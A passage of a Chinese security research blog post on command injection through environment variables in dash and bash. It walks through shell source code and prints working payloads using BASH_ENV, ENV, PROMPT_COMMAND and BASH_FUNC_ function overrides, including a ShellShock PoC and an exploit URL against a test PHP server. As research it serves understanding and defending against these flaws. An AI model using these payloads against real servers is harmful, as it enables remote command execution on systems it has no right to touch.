+<p>我看了两晚上dash代码，几乎要给我看吐了，我很难理解为什么代码里要用这么多goto。最后还是很遗憾，虽然找到了两个可以进行命令注入的环境变量，但它们都不能在<code>sh -c</code>时触发。</p>
+<p>我的目标转向了Bash，如果目标系统是CentOS，那么系统上的sh指向的是Bash，此时是否能有突破呢？</p>
+<p>因为有之前Dash的经验，在Bash中我很快也关注到了和之前<code>ENV</code>那一段比较类似的代码：</p>
+<div class="codehilite"><pre><span></span><code><span class="cm">/* A non-interactive shell not named `sh&#39; and not in posix mode reads and</span>
+<span class="cm">     executes commands from $BASH_ENV.  If `su&#39; starts a shell with `-c cmd&#39;</span>
+<span class="cm">     and `-su&#39; as the name of the shell, we want to read the startup files.</span>
+<span class="cm">     No other non-interactive shells read any startup files. */</span><span class="w"></span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">interactive_shell</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="p">(</span><span class="n">su_shell</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">login_shell</span><span class="p">))</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">posixly_correct</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">act_like_sh</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">privileged_mode</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"></span>
+<span class="w">        </span><span class="n">sourced_env</span><span class="o">++</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
+<span class="w">        </span><span class="n">execute_env_file</span><span class="w"> </span><span class="p">(</span><span class="n">get_string_value</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;BASH_ENV&quot;</span><span class="p">));</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>在Bash中这个环境变量叫<code>BASH_ENV</code>，我也没法确定它是否也有和<code>ENV</code>类似的问题，但是我直接用前面的POC盲测了一下：</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">BASH_ENV</span><span class="o">=</span><span class="s1">&#39;$(id 1&gt;&amp;2)&#39;</span> bash -c <span class="s1">&#39;echo hello&#39;</span>
+</code></pre></div>
+
+<p><a href="../media/attachment/2022/02/21/53c5feca-33b8-49e7-87ee-6be315f3d5ee.png"><img alt="image.png" src="../media/attachment/2022/02/21/53c5feca-33b8-49e7-87ee-6be315f3d5ee.034f399cc5e1.png" /></a></p>
+<p>哈哈，直接注入成功了，而且这里是不需要传入其他参数的！不过很快我发现自己高兴地过早了。</p>
+<p>我实际在CentOS下测试发现，如果执行的是<code>sh -c</code>则无法复现命令注入；如果执行的是<code>bash -c</code>是可以注入的：</p>
+<p><a href="../media/attachment/2022/02/21/4b6e7d20-b26d-489a-872a-c52fe699cc01.png"><img alt="image.png" src="../media/attachment/2022/02/21/4b6e7d20-b26d-489a-872a-c52fe699cc01.6a80c12099e5.png" /></a></p>
+<p>很神奇，明明sh只是个软连接，指向的是bash，也就是说两次执行的是同一个程序，但结果却出现了差异。而PHP中执行的是sh，不是bash，这也导致我们无法利用成功最初的代码。</p>
+<p>那么来看看原因吧，动态调试bash，断点在上面那两个if语句上：</p>
+<p><a href="../media/attachment/2022/02/21/671ac7ca-6b77-4e39-94d6-91e37841acbf.png"><img alt="image.png" src="../media/attachment/2022/02/21/671ac7ca-6b77-4e39-94d6-91e37841acbf.eea0d5595469.png" /></a></p>
+<p>可见，内部这个if语句没有进去，原因是此时<code>act_like_sh</code>这个变量的值是1。我们找到这个变量的赋值点：</p>
+<p><a href="../media/attachment/2022/02/21/e9bda314-aac3-4b5f-a96c-d44d08da3bd3.png"><img alt="image.png" src="../media/attachment/2022/02/21/e9bda314-aac3-4b5f-a96c-d44d08da3bd3.2c0a30a9eb8c.png" /></a></p>
+<p>当shell名字<code>shell_name</code>这个变量等于<code>sh</code>的时候，<code>act_like_sh</code>会变成1。这也就解释了我们前面反常的结果——为什么<code>bash -c</code>可以注入命令但<code>sh -c</code>不可以。</p>
+<p>虽然这个发现没有解决我最初提出的问题，但仍然是往前垮了一步，即<strong>我们在不控制bash的参数的情况下，可以通过环境变量注入任意命令</strong>。这可能在部分情况下会有一些作用。</p>
+<h2 id="0x07"><a class="toclink" href="#0x07">0x07 另一些没什么用的命令注入</a></h2>
+<p>我们仍然看到上面<code>BASH_ENV</code>的那一段代码，在第一个if语句后面，也有一段与环境变量<code>ENV</code>相关的代码：</p>
+<div class="codehilite"><pre><span></span><code><span class="cm">/* A non-interactive shell not named `sh&#39; and not in posix mode reads and</span>
+<span class="cm">     executes commands from $BASH_ENV.  If `su&#39; starts a shell with `-c cmd&#39;</span>
+<span class="cm">     and `-su&#39; as the name of the shell, we want to read the startup files.</span>
+<span class="cm">     No other non-interactive shells read any startup files. */</span><span class="w"></span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">interactive_shell</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="p">(</span><span class="n">su_shell</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">login_shell</span><span class="p">))</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">posixly_correct</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">act_like_sh</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">privileged_mode</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"></span>
+<span class="w">        </span><span class="n">sourced_env</span><span class="o">++</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
+<span class="w">        </span><span class="n">execute_env_file</span><span class="w"> </span><span class="p">(</span><span class="n">get_string_value</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;BASH_ENV&quot;</span><span class="p">));</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+<span class="c1">// ...</span>
+
+<span class="cm">/* bash */</span><span class="w"></span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">act_like_sh</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">no_rc</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">maybe_execute_file</span><span class="w"> </span><span class="p">(</span><span class="n">SYS_BASHRC</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">maybe_execute_file</span><span class="w"> </span><span class="p">(</span><span class="n">bashrc_file</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+<span class="cm">/* sh */</span><span class="w"></span>
+<span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">act_like_sh</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">privileged_mode</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">sourced_env</span><span class="o">++</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
+<span class="w">    </span><span class="n">execute_env_file</span><span class="w"> </span><span class="p">(</span><span class="n">get_string_value</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;ENV&quot;</span><span class="p">));</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+<span class="k">else</span><span class="w">        </span><span class="cm">/* bash --posix, sh --posix */</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="cm">/* bash and sh */</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">interactive_shell</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">privileged_mode</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">sourced_env</span><span class="o">++</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
+<span class="w">        </span><span class="n">execute_env_file</span><span class="w"> </span><span class="p">(</span><span class="n">get_string_value</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;ENV&quot;</span><span class="p">));</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>但很明显，想要执行到后面，必须不能进入第一个if语句，即<strong>不能</strong>满足这个条件：<code>interactive_shell == 0 &amp;&amp; !(su_shell &amp;&amp; login_shell)</code>。用文字翻译下就是：</p>
+<ul>
+<li>需要是交互式shell，即传入<code>-i</code>参数</li>
+<li>或者是su且login模式的shell</li>
+</ul>
+<p>所以，与dash类似，我们通过<code>ENV</code>也可以注入命令，只不过也需要额外的参数：</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">ENV</span><span class="o">=</span><span class="s1">&#39;$(id 1&gt;&amp;2)&#39;</span> sh -i -c <span class="s2">&quot;echo hello&quot;</span>
+</code></pre></div>
+
+<p><a href="../media/attachment/2022/02/21/a6710b40-9af4-4407-a433-d25903fc2efa.png"><img alt="image.png" src="../media/attachment/2022/02/21/a6710b40-9af4-4407-a433-d25903fc2efa.3620eb9d2e34.png" /></a></p>
+<p>与dash类似，PS1也可以在bash中利用：</p>
+<p><a href="../media/attachment/2022/02/21/11b22f58-b777-4a1f-85a4-0f4b92d6839a.png"><img alt="image.png" src="../media/attachment/2022/02/21/11b22f58-b777-4a1f-85a4-0f4b92d6839a.6273d0adac6d.png" /></a></p>
+<p>在翻看代码的时候，我还找到了另一个有趣的新的环境变量，<code>PROMPT_COMMAND</code>。在设置了这个环境变量后，进入交互式模式前，会执行这个变量里包含的命令：</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">PROMPT_COMMAND</span><span class="o">=</span><span class="s1">&#39;id&#39;</span> bash
+</code></pre></div>
+
+<p><a href="../media/attachment/2022/02/21/c6c7af71-edb8-469d-8315-97be1fec4744.png"><img alt="image.png" src="../media/attachment/2022/02/21/c6c7af71-edb8-469d-8315-97be1fec4744.14138b28f212.png" /></a></p>
+<p>但如果指定了<code>-c</code>，则这个变量不会被执行。</p>
+<p>所以，虽然这一节里我找到了多个可以执行命令的环境变量，但都不能在<code>sh -c</code>的情况下直接利用，我一度以为自己的C语言阅读能力也就是没法解决这个问题了。</p>
+<h2 id="0x08"><a class="toclink" href="#0x08">0x08 峰回路转，走出一条小道</a></h2>
+<p>周五熬夜到很晚才睡，看了几个小时代码，脑袋昏昏沉沉的一点发现都没有。周六晚上又重新打开了Bash的代码，继续啃一啃，没想到不到10分钟就有了新发现。</p>
+<blockquote>
+<p>这也反映出一个问题，脑袋不清醒的时候就别看代码了，写点文章就行了。</p>
+</blockquote>
+<p>variables.c的<code>initialize_shell_variables</code>函数用于将环境变量注册成SHELL的变量，其中包含的一段代码引起了我的注意：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">string_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">env</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">env</span><span class="p">[</span><span class="n">string_index</span><span class="o">++</span><span class="p">]);</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">string</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="c1">// ...</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">privmode</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">read_but_dont_execute</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>
+<span class="w">        </span><span class="n">STREQN</span><span class="w"> </span><span class="p">(</span><span class="n">BASHFUNC_PREFIX</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">BASHFUNC_PREFLEN</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"></span>
+<span class="w">        </span><span class="n">STREQ</span><span class="w"> </span><span class="p">(</span><span class="n">BASHFUNC_SUFFIX</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">char_index</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">BASHFUNC_SUFFLEN</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"></span>
+<span class="w">        </span><span class="n">STREQN</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;() {&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">string</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">))</span><span class="w"></span>
+<span class="w">    </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="kt">size_t</span><span class="w"> </span><span class="n">namelen</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">tname</span><span class="p">;</span><span class="w">        </span><span class="cm">/* desired imported function name */</span><span class="w"></span>
+
+<span class="w">        </span><span class="n">namelen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">char_index</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">BASHFUNC_PREFLEN</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">BASHFUNC_SUFFLEN</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">        </span><span class="n">tname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">BASHFUNC_PREFLEN</span><span class="p">;</span><span class="w">    </span><span class="cm">/* start of func name */</span><span class="w"></span>
+<span class="w">        </span><span class="n">tname</span><span class="p">[</span><span class="n">namelen</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">;</span><span class="w">      </span><span class="cm">/* now tname == func name */</span><span class="w"></span>
+
+<span class="w">        </span><span class="n">string_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="w"> </span><span class="p">(</span><span class="n">string</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="n">temp_string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">xmalloc</span><span class="w"> </span><span class="p">(</span><span class="n">namelen</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">string_length</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">        </span><span class="n">memcpy</span><span class="w"> </span><span class="p">(</span><span class="n">temp_string</span><span class="p">,</span><span class="w"> </span><span class="n">tname</span><span class="p">,</span><span class="w"> </span><span class="n">namelen</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="n">temp_string</span><span class="p">[</span><span class="n">namelen</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39; &#39;</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="n">memcpy</span><span class="w"> </span><span class="p">(</span><span class="n">temp_string</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">namelen</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">string</span><span class="p">,</span><span class="w"> </span><span class="n">string_length</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">        </span><span class="cm">/* Don&#39;t import function names that are invalid identifiers from the</span>
+<span class="cm">         environment in posix mode, though we still allow them to be defined as</span>
+<span class="cm">         shell variables. */</span><span class="w"></span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">absolute_program</span><span class="w"> </span><span class="p">(</span><span class="n">tname</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">posixly_correct</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">legal_identifier</span><span class="w"> </span><span class="p">(</span><span class="n">tname</span><span class="p">)))</span><span class="w"></span>
+<span class="w">            </span><span class="n">parse_and_execute</span><span class="w"> </span><span class="p">(</span><span class="n">temp_string</span><span class="p">,</span><span class="w"> </span><span class="n">tname</span><span class="p">,</span><span class="w"> </span><span class="n">SEVAL_NONINT</span><span class="o">|</span><span class="n">SEVAL_NOHIST</span><span class="o">|</span><span class="n">SEVAL_FUNCDEF</span><span class="o">|</span><span class="n">SEVAL_ONECMD</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="k">else</span><span class="w"></span>
+<span class="w">            </span><span class="n">free</span><span class="w"> </span><span class="p">(</span><span class="n">temp_string</span><span class="p">);</span><span class="w">     </span><span class="cm">/* parse_and_execute does this */</span><span class="w"></span>
+<span class="w">        </span><span class="c1">//...</span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>这里for遍历了所有环境变量，并用<code>=</code>分割，<code>name</code>就是环境变量名，<code>string</code>是值。</p>
+<p>当满足下面这些条件的情况下，<code>temp_string</code>将被传入<code>parse_and_execute</code>执行：</p>
+<ul>
+<li><code>privmode == 0</code>，即不能传入<code>-p</code>参数</li>
+<li><code>read_but_dont_execute == 0</code>，即不能传入<code>-n</code>参数</li>
+<li><code>STREQN (BASHFUNC_PREFIX, name, BASHFUNC_PREFLEN)</code>，环境变量名前10个字符等于<code>BASH_FUNC_</code></li>
+<li><code>STREQ (BASHFUNC_SUFFIX, name + char_index - BASHFUNC_SUFFLEN)</code>，环境变量名后两个字符等于<code>%%</code></li>
+<li><code>STREQN ("() {", string, 4)</code>，环境变量的值前4个字符等于<code>() {</code></li>
+</ul>
+<p>前两个条件肯定是满足的，后三个条件是用户可控的，所以这个if语句是肯定可以进入的。进入if语句后，去除前缀<code>BASH_FUNC_</code>和后缀<code>%%</code>的部分将是一个变量名，而由<code>() {</code>开头的字符串将会被执行。</p>
+<p>这里其实做的就是一件事：<strong>根据环境变量的值初始化一个匿名函数，并赋予其名字</strong>。</p>
+<p>所以，我们传入下面这样一个环境变量，将会在Bash上下文中添加一个myfunc函数：</p>
+<div class="codehilite"><pre><span></span><code>env <span class="s1">$&#39;BASH_FUNC_myfunc%%=() { id; }&#39;</span> bash -c <span class="s1">&#39;myfunc&#39;</span>
+</code></pre></div>
+
+<p><a href="../media/attachment/2022/02/21/0619bb4a-7419-4cc4-9527-1435bbb3636b.png"><img alt="image.png" src="../media/attachment/2022/02/21/0619bb4a-7419-4cc4-9527-1435bbb3636b.00fa91df112a.png" /></a></p>
+<p>这里仍然存在一个问题是，因为在执行<code>parse_and_execute</code>的时候配置了<code>SEVAL_FUNCDEF</code>，我们只能利用这个方法定义函数，而无法逃逸出函数执行任意命令。解决这个问题的方法也很简单，我们只需要覆盖一些已有的“命令”，在后面执行这个命令的时候就可以执行到我们定义的函数里了。</p>
+<p>那么，回到本文开头说的那个问题，我添加了一个名为<code>echo</code>的函数，这样在执行<code>echo hello</code>的时候实际上执行的是我添加的函数：</p>
+<div class="codehilite"><pre><span></span><code>env <span class="s1">$&#39;BASH_FUNC_echo%%=() { id; }&#39;</span> bash -c <span class="s1">&#39;echo hello&#39;</span>
+</code></pre></div>
+
+<p><a href="../media/attachment/2022/02/21/37d67a06-6efd-4758-878e-e69eecc526b4.png"><img alt="image.png" src="../media/attachment/2022/02/21/37d67a06-6efd-4758-878e-e69eecc526b4.0e974983ad60.png" /></a></p>
+<p>几乎成功解决了这个问题。</p>
+<h2 id="0x09-bash"><a class="toclink" href="#0x09-bash">0x09 Bash版本的导致的不完美</a></h2>
+<p>为什么说是几乎？因为我实际在CentOS 7下做测试的时候，我发现并不能复现这个trick。</p>
+<p>经过研究发现，CentOS 7下使用的是Bash 4.2，而<code>BASH_FUNC_</code>这个trick是在Bash 4.4下引入的……这就十分尴尬了。因为CentOS 8下的Bash是4.4版本，我们可以使用它进行测试。</p>
+<p>在CentOS 8下安装PHP，并使用本文开头的代码，直接运行一个测试服务器：</p>
+<p><a href="../media/attachment/2022/02/21/755f284d-44e3-4e33-80f3-030fe4b41fac.png"><img alt="image.png" src="../media/attachment/2022/02/21/755f284d-44e3-4e33-80f3-030fe4b41fac.40f85f011b67.png" /></a></p>
+<p>访问<code>http://192.168.1.162:8080/1.php?envs[BASH_FUNC_echo%25%25]=()%20{%20id;%20}</code>即可执行id命令：</p>
+<p><a href="../media/attachment/2022/02/21/eedcd10f-7806-4c0e-801d-0950de1d5513.png"><img alt="image.png" src="../media/attachment/2022/02/21/eedcd10f-7806-4c0e-801d-0950de1d5513.0531c0b03568.png" /></a></p>
+<p><s>虽然这个方法存在一定的版本和操作系统限制，但我相信随着时间的推移，使用新版操作系统（虽然CentOS 8已经死掉了，但CentOS Stream、Redhat仍然在继续发展）的服务器越来越多，这个trick会变地更加普世。</s></p>
+<p>那么，我们是否可以突破CentOS 7下的限制呢？</p>
+<h2 id="0x0a-centos-7"><a class="toclink" href="#0x0a-centos-7">0x0A 攻克CentOS 7</a></h2>
+<p>我本来以为这次的研究到头了，于是在还没有解决CentOS 7的问题时就把文章发了出来。</p>
+<p>但我很快意识到我忽略了一个我很早就该注意到的问题——破壳漏洞（ShellShock）。我这次发现的这个POC和ShellShock的POC很相似，原因就是，这个<code>BASH_FUNC</code>的环境变量，就是因为修复ShellShock而引入的。</p>
+<p>在ShellShock刚出现的时候，Bash的最新版本是4.3，这也是为什么Bash 4.4的时候引入了<code>BASH_FUNC</code>。但是，这不代表4.4以下的Bash就没有修复ShellShock漏洞，那么，他们是怎么修复的呢？</p>
+<p>经过研究我发现，CentOS 7这类操作系统虽然修复了ShellShock漏洞，但是并不是通过升级Bash版本来修复的，而是通过“打补丁”。</p>
+<p>我们来看看redhat对于Bash 4.2的补丁：<a href="https://bugzilla-attachments.redhat.com/attachment.cgi?id=941826" target="_blank">https://bugzilla-attachments.redhat.com/attachment.cgi?id=941826</a></p>
+<div class="codehilite"><pre><span></span><code><span class="gd">--- ../bash-4.2-orig/variables.c    2014-09-25 13:07:59.313209541 +0200</span><span class="w"></span>
+<span class="gi">+++ variables.c 2014-09-25 13:15:29.869420719 +0200</span><span class="w"></span>
+<span class="gu">@@ -268,7 +268,7 @@</span><span class="w"></span>
+<span class="w"> </span>static void propagate_temp_var __P((PTR_T));<span class="w"></span>
+<span class="w"> </span>static void dispose_temporary_env __P((sh_free_func_t *));     <span class="w"></span>
+
+<span class="gd">-static inline char *mk_env_string __P((const char *, const char *));</span><span class="w"></span>
+<span class="gi">+static inline char *mk_env_string __P((const char *, const char *, int));</span><span class="w"></span>
+<span class="w"> </span>static char **make_env_array_from_var_list __P((SHELL_VAR **));<span class="w"></span>
+<span class="w"> </span>static char **make_var_export_array __P((VAR_CONTEXT *));<span class="w"></span>
+<span class="w"> </span>static char **make_func_export_array __P((void));<span class="w"></span>
+<span class="gu">@@ -301,6 +301,14 @@</span><span class="w"></span>
+<span class="w"> </span>#endif<span class="w"></span>
+<span class="w"> </span>}<span class="w"></span>
+
+<span class="gi">+/* Prefix and suffix for environment variable names which contain</span><span class="w"></span>
+<span class="gi">+   shell functions. */</span><span class="w"></span>
+<span class="gi">+#define FUNCDEF_PREFIX &quot;BASH_FUNC_&quot;</span><span class="w"></span>
+<span class="gi">+#define FUNCDEF_PREFIX_LEN (strlen (FUNCDEF_PREFIX))</span><span class="w"></span>
+<span class="gi">+#define FUNCDEF_SUFFIX &quot;()&quot;</span><span class="w"></span>
+<span class="gi">+#define FUNCDEF_SUFFIX_LEN (strlen (FUNCDEF_SUFFIX))</span><span class="w"></span>
+<span class="gi">+</span><span class="w"></span>
+<span class="gi">+</span><span class="w"></span>
+</code></pre></div>
+
+<p>可见，在这个补丁里也引入了<code>FUNCDEF_PREFIX</code>和<code>FUNCDEF_SUFFIX</code>，只不过和4.4以下的有一处差异：<strong>Bash 4.4下<code>FUNCDEF_SUFFIX</code>等于<code>%%</code>，而这个4.2的补丁中<code>FUNCDEF_SUFFIX</code>等于<code>()</code></strong>。</p>
+<p>这也我在CentOS 7下没有测试成功的原因，因为我设置的环境变量名不对。</p>
+<p>所以，我修改了环境变量名重新测试，在CentOS 7下也能成功复现了：</p>
+<div class="codehilite"><pre><span></span><code>env <span class="s1">$&#39;BASH_FUNC_echo()=() { id; }&#39;</span> bash -c <span class="s2">&quot;echo hello&quot;</span>
+</code></pre></div>
+
+<p><a href="../media/attachment/2022/02/23/8760b689-7bc0-41f9-ac0e-f2816f0e0348.png"><img alt="image.png" src="../media/attachment/2022/02/23/8760b689-7bc0-41f9-ac0e-f2816f0e0348.c882cd90de1b.png" /></a></p>
+<p>所以，之后我们遇到环境变量注入，可以进行下列三种测试：</p>
+<ul>
+<li>Bash没有修复ShellShock漏洞：直接使用ShellShock的POC进行测试，例如<code>TEST=() { :; }; id;</code></li>
+<li>Bash 4.4以前：<code>env $'BASH_FUNC_echo()=() { id; }' bash -c "echo hello"</code></li>
+<li>Bash 4.4及以上：<code>env $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello'</code></li>
+</ul>
+<p>在CentOS系系统下完美解决本文开头提到的问题，通杀所有Bash。</p>
+<h2 id="0x0b"><a class="toclink" href="#0x0b">0x0B 总结</a></h2>
+<p>本文完整地讲述了我是如何研究环境变量注入导致的安全问题。</p>
+<p>经过阅读dash和bash的代码，我发现了这样一些可以导致命令注入的环境变量：</p>
+<ul>
+<li><code>BASH_ENV</code>：可以在<code>bash -c</code>的时候注入任意命令</li>
+<li><code>ENV</code>：可以在<code>sh -i -c</code>的时候注入任意命令</li>
+<li><code>PS1</code>：可以在<code>sh</code>或<code>bash</code>交互式环境下执行任意命令</li>
+<li><code>PROMPT_COMMAND</code>：可以在<code>bash</code>交互式环境下执行任意命令</li>
+<li><code>BASH_FUNC_xxx%%</code>：可以在<code>bash -c</code>或<code>sh -c</code>的时候执行任意命令</li>
+</ul>
+<p>利用最后一个trick，我成功在CentOS下解决了本文开头提出的问题。</p>
+<p>不过，C语言并不是我的专长，bash的逻辑也比我阅读代码前想的复杂很多，我预感dash和bash中绝对不止上述这些执行命令的方法，只不过我暂时只能发现了这些了。</p>
+<p>最后吐槽一下dash的代码质量，看的我真的想吐，集成了下面三个我最痛恨的C语言特性：</p>
+<ul>
+<li>goto</li>
+<li>宏</li>
+<li>全局变量</li>
+</ul>
+<p>希望有朝一日dash能被重构吧。</p>
+          </div>
+        </article>
+
+        
+          <h1 class="h1 color-main">赞赏</h1>
+          <div class="zan text-center">
+            <p>喜欢这篇文章？打赏1元</p>
+            <p class="m-0"><img src="../static/wx.jpg" width="280" alt=""></p>
+          </div>
+        
+
+        <div id="reply-list">
+          <h1 class="h1 color-main">评论</h1>
+          
+            
+              <div class="flex mb-2" id="comment-3920">
+                <div class="gravatar">
+                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
+                </div>
+                <div class="ps-2">
+                  <p class="comment-meta title">
+                    <a href="" target="_blank" rel="nofollow noopener">aaa</a>
+                    <time datetime="2022年7月21日 15:24" itemprop="datePublished">
+                      2022 七月 21 15:24
+                    </time>
+                    <a href="javascript:reply_to('3920', 'aaa')">回复</a>
+                  </p>
+                  <p class="comment-meta">牛逼</p>
+                </div>
+              </div>
+              
+            
+              <div class="flex mb-2" id="comment-3912">
+                <div class="gravatar">
+                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
+                </div>
+                <div class="ps-2">
+                  <p class="comment-meta title">
+                    <a href="" target="_blank" rel="nofollow noopener">水手</a>
+                    <time datetime="2022年7月18日 12:01" itemprop="datePublished">
+                      2022 七月 18 12:01
